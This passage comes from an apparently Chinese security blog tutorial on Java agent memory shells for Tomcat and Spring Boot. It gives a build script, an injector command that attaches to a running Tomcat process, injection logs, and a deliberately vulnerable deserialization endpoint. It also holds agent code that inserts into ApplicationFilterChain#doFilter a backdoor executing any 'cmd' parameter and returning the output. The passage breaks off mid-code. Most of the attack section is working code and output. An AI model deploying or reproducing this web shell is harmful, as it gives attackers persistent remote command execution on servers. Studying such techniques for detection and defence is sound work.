+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs bash">@<span class="hljs-built_in">echo</span> off<br>setlocal<br><br><span class="hljs-built_in">echo</span> Setting up environment...<br><span class="hljs-built_in">set</span> JAVA_HOME=D:\Java\jdk1.8.0_65<br><span class="hljs-built_in">set</span> PATH=%JAVA_HOME%\bin;%PATH%<br><br><span class="hljs-built_in">echo</span> [1/6] Cleaning target directory...<br><span class="hljs-keyword">if</span> exist target <span class="hljs-built_in">rmdir</span> /s /q target<br><span class="hljs-built_in">mkdir</span> target<br><span class="hljs-built_in">mkdir</span> target\classes<br><br><span class="hljs-built_in">echo</span> [2/6] Compiling agent classes...<br><span class="hljs-string">&quot;%JAVA_HOME%\bin\javac&quot;</span> -encoding UTF-8 -<span class="hljs-built_in">cp</span> <span class="hljs-string">&quot;lib\javassist.jar&quot;</span> -d target\classes src\main\java\com\src\agent\*.java<br><span class="hljs-keyword">if</span> errorlevel 1 (<br>    <span class="hljs-built_in">echo</span> Failed to compile agent classes!<br>    pause<br>    <span class="hljs-built_in">exit</span> /b 1<br>)<br><br><span class="hljs-built_in">echo</span> [3/6] Compiling injector class...<br><span class="hljs-string">&quot;%JAVA_HOME%\bin\javac&quot;</span> -encoding UTF-8 -<span class="hljs-built_in">cp</span> <span class="hljs-string">&quot;D:\Java\jdk1.8.0_65\lib\tools.jar;target\classes&quot;</span> -d target\classes src\main\java\com\src\injector\*.java<br><span class="hljs-keyword">if</span> errorlevel 1 (<br>    <span class="hljs-built_in">echo</span> Failed to compile injector class!<br>    pause<br>    <span class="hljs-built_in">exit</span> /b 1<br>)<br><br><span class="hljs-built_in">echo</span> [4/6] Merging javassist into classes...<br><span class="hljs-built_in">pushd</span> target\classes<br><span class="hljs-string">&quot;%JAVA_HOME%\bin\jar&quot;</span> xf ..\..\lib\javassist.jar<br><span class="hljs-built_in">popd</span><br><br><span class="hljs-built_in">echo</span> [5/6] Packaging agent JAR...<br>rem 如果 src\main\resources\META-INF\MANIFEST.MF 存在则使用它<br><span class="hljs-built_in">set</span> MANIFEST_FILE=src\main\resources\META-INF\MANIFEST.MF<br><span class="hljs-keyword">if</span> not exist <span class="hljs-string">&quot;%MANIFEST_FILE%&quot;</span> <span class="hljs-built_in">set</span> MANIFEST_FILE=META-INF\MANIFEST.MF<br><br><span class="hljs-string">&quot;%JAVA_HOME%\bin\jar&quot;</span> cfm target\Demo01-1.0-SNAPSHOT.jar <span class="hljs-string">&quot;%MANIFEST_FILE%&quot;</span> -C target\classes .<br><span class="hljs-keyword">if</span> errorlevel 1 (<br>    <span class="hljs-built_in">echo</span> Failed to package agent JAR!<br>    pause<br>    <span class="hljs-built_in">exit</span> /b 1<br>)<br><br><span class="hljs-built_in">echo</span> [6/6] Creating injector JAR...<br><span class="hljs-string">&quot;%JAVA_HOME%\bin\jar&quot;</span> cfe target\Injector.jar com.src.injector.Injector -C target\classes .<br><span class="hljs-keyword">if</span> errorlevel 1 (<br>    <span class="hljs-built_in">echo</span> Failed to package injector JAR!<br>    pause<br>    <span class="hljs-built_in">exit</span> /b 1<br>)<br><br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span> ========================================<br><span class="hljs-built_in">echo</span> Build Successful!<br><span class="hljs-built_in">echo</span> Generated files:<br><span class="hljs-built_in">echo</span>   - target\Demo01-1.0-SNAPSHOT.jar (Agent with embedded javassist)<br><span class="hljs-built_in">echo</span>   - target\Injector.jar (Injector)<br><span class="hljs-built_in">echo</span> ========================================<br><span class="hljs-built_in">echo</span>.<br><br>pause<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h5 id="执行-build-bat"><a href="#执行-build-bat" class="headerlink" title="执行 build.bat"></a>执行 build.bat</h5><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523243.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h4 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h4><h5 id="启动一个-Tomcat"><a href="#启动一个-Tomcat" class="headerlink" title="启动一个 Tomcat"></a>启动一个 Tomcat</h5><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523492.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081524494.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h5 id="Tomcat-进程"><a href="#Tomcat-进程" class="headerlink" title="Tomcat 进程"></a>Tomcat 进程</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain"># 查看所有 Java 进程<br>jps -l<br><br># 查看进程详细信息<br>tasklist | findstr &quot;java&quot;<br><br># 或者使用 wmic<br>wmic process where &quot;name=&#x27;java.exe&#x27;&quot; get processid,commandline<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525788.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>找到进程：<strong>40268 org.apache.catalina.startup.Bootstrap</strong></p>
+<h5 id="测试注入"><a href="#测试注入" class="headerlink" title="测试注入"></a>测试注入</h5><p><strong>使用管理员身份运行！！</strong></p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">java <span class="hljs-operator">-</span>cp <span class="hljs-string">&quot;D:<span class="hljs-char escape_">\J</span>ava<span class="hljs-char escape_">\j</span>dk1.8.0_65<span class="hljs-char escape_">\l</span>ib<span class="hljs-char escape_">\t</span>ools.jar;D:<span class="hljs-char escape_">\J</span>avaCode<span class="hljs-char escape_">\内</span>存马<span class="hljs-char escape_">\A</span>gentMem<span class="hljs-char escape_">\D</span>emo01<span class="hljs-char escape_">\t</span>arget<span class="hljs-char escape_">\I</span>njector.jar&quot;</span> com.src.injector.Injector <span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-number">40268</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span> D:\JavaCode\内存马\AgentMem\Demo01\target\Demo01-<span class="hljs-number">1</span>.<span class="hljs-number">0</span><span class="hljs-operator">-</span>SNAPSHOT.jar<br></code></pre></td></tr></table></figure>
+
+<p>（为了防止一些莫名其妙的错误，使用了绝对路径）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525851.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>注入成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523146.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>Tomcat 日志：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs plain">// Agent 已经被成功加载到目标 JVM 中，agentmain() 被调用，注入成功<br>AgentMemShell Injected!<br><br>//对多个已加载（loaded）且继承自 HttpServlet 的类执行了 retransformClasses()，并且这些子类都成功被重转换（retransform success）<br>Found HttpServlet subclass: class org.apache.jsp.index_jsp<br>Retransform subclass Success: class org.apache.jsp.index_jsp<br>Found HttpServlet subclass: class com.src.testtomcat.HelloServlet<br>Retransform subclass Success: class com.src.testtomcat.HelloServlet<br>Found HttpServlet subclass: class org.apache.jasper.runtime.HttpJspBase<br>Retransform subclass Success: class org.apache.jasper.runtime.HttpJspBase<br>Found HttpServlet subclass: class org.apache.jasper.servlet.JspServlet<br>[Debug] Loading class: org/apache/jasper/servlet/JspServlet<br>Retransform subclass Success: class org.apache.jasper.servlet.JspServlet<br>Found HttpServlet subclass: class org.apache.catalina.servlets.DefaultServlet<br>[Debug] Loading class: org/apache/catalina/servlets/DefaultServlet<br>Retransform subclass Success: class org.apache.catalina.servlets.DefaultServlet<br><br>//成功对 javax.servlet.http.HttpServlet（基类） 做了 transform（插入/修改字节码），并把修改生效了（retransform success）<br>Found HttpServlet (base): class javax.servlet.http.HttpServlet<br>[Debug] Loading class: javax/servlet/http/HttpServlet<br>[+] Found target class: javax.servlet.http.HttpServlet<br>[+] Start transforming HttpServlet...<br>[+] HttpServlet Transformed Complete.<br>Retransform HttpServlet Success.<br><br>//transform() 调用中抛出了 NullPointerException<br>[!] Transform failed: java.lang.NullPointerException<br>java.lang.NullPointerException<br>	at com.src.agent.ServletTransformer.transform(ServletTransformer.java:28)<br>	at sun.instrument.TransformerManager.transform(TransformerManager.java:188)<br>	at sun.instrument.InstrumentationImpl.transform(InstrumentationImpl.java:428)<br>	at sun.misc.Unsafe.defineAnonymousClass(Native Method)<br>	at java.lang.invoke.InnerClassLambdaMetafactory.spinInnerClass(InnerClassLambdaMetafactory.java:326)<br>	at java.lang.invoke.InnerClassLambdaMetafactory.buildCallSite(InnerClassLambdaMetafactory.java:194)<br>	at java.lang.invoke.LambdaMetafactory.metafactory(LambdaMetafactory.java:304)<br>	at java.lang.invoke.CallSite.makeSite(CallSite.java:302)<br>	at java.lang.invoke.MethodHandleNatives.linkCallSiteImpl(MethodHandleNatives.java:307)<br>	at java.lang.invoke.MethodHandleNatives.linkCallSite(MethodHandleNatives.java:297)<br>	at org.apache.tomcat.util.http.Parameters.addParameter(Parameters.java:212)<br>	at org.apache.tomcat.util.http.Parameters.processParameters(Parameters.java:390)<br>	at org.apache.tomcat.util.http.Parameters.processParameters(Parameters.java:481)<br>	at org.apache.tomcat.util.http.Parameters.handleQueryParameters(Parameters.java:194)<br>	at org.apache.catalina.connector.Request.parseParameters(Request.java:2938)<br>	at org.apache.catalina.connector.Request.getParameter(Request.java:1088)<br>	at org.apache.catalina.connector.RequestFacade.getParameter(RequestFacade.java:309)<br>	at javax.servlet.http.HttpServlet.service(HttpServlet.java)<br>	at javax.servlet.http.HttpServlet.service(HttpServlet.java:623)<br>	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:199)<br>	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:144)<br>	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:51)<br>	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:168)<br>	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:144)<br>	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:168)<br>	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:90)<br>	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:482)<br>	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:130)<br>	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:93)<br>	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:656)<br>	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)<br>	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:346)<br>	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:397)<br>	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)<br>	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:935)<br>	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1792)<br>	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)<br>	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1189)<br>	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:658)<br>	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:63)<br>	at java.lang.Thread.run(Thread.java:745)<br></code></pre></td></tr></table></figure>
+
+
+
+<p>可以执行命令：</p>
+<p>（：但是当前的内存马只是部分生效，&#x2F;hello-servlet 路径可以执行，其他不可以</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523380.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523450.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="4-3-2-方式二"><a href="#4-3-2-方式二" class="headerlink" title="4.3.2 方式二"></a>4.3.2 方式二</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>SpringBoot 2.6.13  </p>
+<p>CommonCollection 3.2.1</p>
+<p>搭建一个反序列化环境：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.demos.web;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentFilter</span> &#123;<br><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/cc&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">cc11Vuln</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span>  request.getInputStream();<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(inputStream);<br>        objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello,World&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/demo&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">demo</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;This is OK Demo!&quot;</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525866.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h4 id="寻找关键类"><a href="#寻找关键类" class="headerlink" title="寻找关键类"></a>寻找关键类</h4><p>在Filter中存在doFilter方法，除了会对我们的请求进行过滤，会依次调用FilterChains中的Filter，同时在 <code>ApplicationFilterChain#doFilter</code> 中还封装了我们用户请求的 request 和 response ，那么如果我们能够注入该方法，那么我们不就可以直接获取用户的请求，将执行结果写在 response 中进行返回。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523934.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h4 id="反序列化注入"><a href="#反序列化注入" class="headerlink" title="反序列化注入"></a>反序列化注入</h4><p>注入流程如下：</p>
+<ol>
+<li>编写 agent.jar 从而实现 <code>org.apache.catalina.core.ApplicationFilterChain#doFilter</code> 进行字节码修改</li>
+<li>利用 <code>CC依赖</code> 的反序列化漏洞将我们的加载代码打进去，然后使其执行来加载我们的 agent.jar</li>
+</ol>
+<h4 id="agent-jar"><a href="#agent-jar" class="headerlink" title="agent.jar"></a>agent.jar</h4><p>pom.xml </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.src<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Demo02<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.29.2-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>AgentMain.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentMain</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String agentArgs, Instrumentation ins)</span> &#123;<br>        ins.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DefineTransformer</span>(),<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// 获取所有已加载的类</span><br>        Class[] classes = ins.getAllLoadedClasses();<br>        <span class="hljs-keyword">for</span> (Class clas:classes)&#123;<br>            <span class="hljs-keyword">if</span> (clas.getName().equals(ClassName))&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    <span class="hljs-comment">// 对类进行重新定义</span><br>                    ins.retransformClasses(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;clas&#125;);<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>DefineTransformer.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefineTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) &#123;<br>        className = className.replace(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;.&quot;</span>);<br>        <span class="hljs-keyword">if</span> (className.equals(ClassName))&#123;<br>            System.out.println(<span class="hljs-string">&quot;Find the Inject Class: &quot;</span> + ClassName);<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">CtClass</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> pool.getCtClass(className);<br>                <span class="hljs-type">CtMethod</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;doFilter&quot;</span>);<br>                m.insertBefore(<span class="hljs-string">&quot;javax.servlet.http.HttpServletRequest req =  request;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;javax.servlet.http.HttpServletResponse res = response;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;java.lang.String cmd = request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +<br>                        <span class="hljs-string">&quot;if (cmd != null)&#123;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;    try &#123;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        String line;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        StringBuilder sb = new StringBuilder(\&quot;\&quot;);\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        while ((line=reader.readLine()) != null)&#123;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;            sb.append(line).append(\&quot;\\n\&quot;);\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        &#125;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        response.getOutputStream().print(sb.toString());\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        response.getOutputStream().flush();\n&quot;</span> +<br>                        <span 